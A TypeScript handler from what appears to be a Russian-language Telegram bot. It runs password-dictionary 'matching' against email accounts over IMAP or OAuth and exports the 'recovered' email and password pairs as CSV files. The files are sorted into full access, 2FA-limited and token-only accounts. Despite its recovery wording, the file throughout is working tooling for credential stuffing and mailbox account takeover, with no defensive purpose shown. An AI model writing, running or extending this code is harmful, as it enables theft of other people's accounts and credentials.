import { InlineKeyboard, InputFile } from "grammy";
import IORedis from "ioredis";
import { db } from "../../services/db.js";
import { matchingQueue } from "../../services/queue.js";
import { getDictionaries } from "../../services/dictionary/manager.js";
import { getFoundMatches, getMatchingStats } from "../../services/matching/engine.js";
import {
  getRecoveredCredentials,
  exportRecoveredCredentials,
} from "../../services/matching/recovered-credentials.js";
import { trackTask } from "../../services/telegram/task-tracker.js";
import { audit } from "../../services/audit.js";
import { config } from "../../config.js";
import type { BotContext } from "../types.js";

export async function handleRecoverCallback(ctx: BotContext) {
  const data = ctx.callbackQuery?.data;
  if (!data?.startsWith("match:")) return;

  const parts = data.split(":");
  const action = parts[1];

  switch (action) {
    case "task":
      return selectTask(ctx, Number(parts[2]));
    case "dict":
      return handleDictSelect(ctx, parts[2]);
    case "method":
      return selectMethod(ctx, parts[2]);
    case "run":
      return startMatching(ctx);
    case "results":
      return sendResults(ctx);
    case "cancel":
      return cancelMatching(ctx);
    default:
      await ctx.answerCallbackQuery();
  }
}

async function selectTask(ctx: BotContext, taskId: number) {
  (ctx.session as any).matchTaskId = taskId;
  (ctx.session as any).matchDictIds = [];
  (ctx.session as any).matchMethod = "imap";

  const dictionaries = await getDictionaries(ctx.dbUser.id);

  if (dictionaries.length === 0) {
    await ctx.answerCallbackQuery();
    await ctx.editMessageText(
      "📖 Нет словарей. Сначала загрузите словарь через /dictionary.",
    );
    return;
  }

  const kb = new InlineKeyboard();
  for (const d of dictionaries.slice(0, 10)) {
    kb.text(`☐ ${d.name} (${d.entryCount})`, `match:dict:${d.id}`).row();
  }
  kb.text("▶ Далее", "match:method:menu").row();
  kb.text("« Назад", "match:back");

  await ctx.answerCallbackQuery();
  await ctx.editMessageText(
    `🔓 <b>Задача #${taskId}</b>\n\n` +
      "Выберите словари для сопоставления (нажмите для toggle):",
    { parse_mode: "HTML", reply_markup: kb },
  );
}

async function handleDictSelect(ctx: BotContext, sub: string) {
  const dictIds: number[] = (ctx.session as any).matchDictIds ?? [];

  if (sub !== "menu") {
    const dictId = Number(sub);
    const idx = dictIds.indexOf(dictId);
    if (idx >= 0) {
      dictIds.splice(idx, 1);
    } else {
      dictIds.push(dictId);
    }
    (ctx.session as any).matchDictIds = dictIds;
  }

  const dictionaries = await getDictionaries(ctx.dbUser.id);
  const selectedSet = new Set(dictIds);

  const kb = new InlineKeyboard();
  for (const d of dictionaries.slice(0, 10)) {
    const mark = selectedSet.has(d.id) ? "☑️" : "☐";
    kb.text(`${mark} ${d.name} (${d.entryCount})`, `match:dict:${d.id}`).row();
  }
  kb.text(`▶ Далее (${dictIds.length} выбрано)`, "match:method:menu").row();

  await ctx.answerCallbackQuery();
  await ctx.editMessageText(
    `🔓 Выберите словари (toggle):`,
    { reply_markup: kb },
  );
}

async function selectMethod(ctx: BotContext, sub: string) {
  if (sub === "menu") {
    const method = (ctx.session as any).matchMethod ?? "imap";
    const kb = new InlineKeyboard()
      .text(method === "imap" ? "● IMAP" : "○ IMAP", "match:method:imap")
      .text(method === "oauth" ? "● OAuth" : "○ OAuth", "match:method:oauth")
      .row()
      .text("▶ Запустить", "match:run");

    await ctx.answerCallbackQuery();
    await ctx.editMessageText(
      "🔓 Выберите метод аутентификации:",
      { reply_markup: kb },
    );
    return;
  }

  (ctx.session as any).matchMethod = sub;
  return selectMethod(ctx, "menu");
}

async function startMatching(ctx: BotContext) {
  const taskId = (ctx.session as any).matchTaskId as number;
  const dictIds = (ctx.session as any).matchDictIds as number[];
  const method = ((ctx.session as any).matchMethod ?? "imap") as "imap" | "oauth";
  const chatId = ctx.chat!.id;

  if (!taskId || !dictIds || dictIds.length === 0) {
    await ctx.answerCallbackQuery("Выберите задачу и словари");
    return;
  }

  const msgId = ctx.callbackQuery?.message?.message_id;

  await matchingQueue.add(`matching-${taskId}`, {
    userId: ctx.dbUser.id,
    taskId,
    dictionaryIds: dictIds,
    method,
    chatId: chatId.toString(),
  });

  await trackTask(taskId, BigInt(chatId), "matching", msgId).catch(() => {});

  audit({
    userId: ctx.dbUser.id,
    type: "matching_started",
    level: "INFO",
    message: `Matching started for task #${taskId} with ${dictIds.length} dictionaries (${method})`,
  });

  await ctx.answerCallbackQuery("Восстановление запущено");
  await ctx.editMessageText(
    `⏳ <b>Восстановление доступа запущено</b>\n\n` +
      `Задача: #${taskId}\n` +
      `Словари: ${dictIds.length}\n` +
      `Метод: ${method}\n\n` +
      `Обработка начнётся через несколько секунд...`,
    { parse_mode: "HTML" },
  );
}

async function sendResults(ctx: BotContext) {
  const recovered = await getRecoveredCredentials(ctx.dbUser.id);

  if (recovered.length === 0) {
    const matches = await getFoundMatches(ctx.dbUser.id);
    if (matches.length === 0) {
      await ctx.answerCallbackQuery("Нет найденных паролей");
      return;
    }
    const lines = ["email,password"];
    for (const m of matches) {
      lines.push(`${m.email},${m.password ?? ""}`);
    }
    const buffer = Buffer.from(lines.join("\n"), "utf-8");
    await ctx.replyWithDocument(new InputFile(buffer, `recovered_${Date.now()}.csv`), {
      caption: `🔓 Найдено ${matches.length} паролей`,
    });
    await ctx.answerCallbackQuery();
    return;
  }

  const buffer = await exportRecoveredCredentials(ctx.dbUser.id, "csv");
  const fileName = `recovered_detailed_${Date.now()}.csv`;

  const fullAccess = recovered.filter((r) => r.accessLevel === "full_access").length;
  const partial = recovered.filter((r) => r.accessLevel === "partial_2fa").length;
  const tokenOnly = recovered.filter((r) => r.accessLevel === "token_only").length;

  await ctx.replyWithDocument(new InputFile(buffer, fileName), {
    caption:
      `🔓 Recovered: ${recovered.length}\n` +
      `🟢 Full Access: ${fullAccess}\n` +
      `🟡 Partial (2FA): ${partial}\n` +
      `🔵 Token Only: ${tokenOnly}`,
  });
  await ctx.answerCallbackQuery();
}

async function cancelMatching(ctx: BotContext) {
  await ctx.answerCallbackQuery("Отменено");
  await ctx.editMessageText("🚫 Восстановление отменено.", {
    parse_mode: "HTML",
  });
}
